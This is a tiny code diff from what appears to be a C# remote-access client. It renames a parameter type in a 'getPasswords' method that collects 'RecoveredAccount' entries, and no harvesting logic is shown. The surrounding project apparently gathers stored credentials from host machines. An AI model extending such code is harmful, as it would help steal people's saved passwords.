@@ -15,7 +15,7 @@ namespace Client.Controllers
     {
         private const string DELIMITER = "$E$";
 
-        public static void getPasswords(GetPasswords packet, ClientMosaic client)
+        public static void getPasswords(GetPasswords packet, ClientMosaique client)
         {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
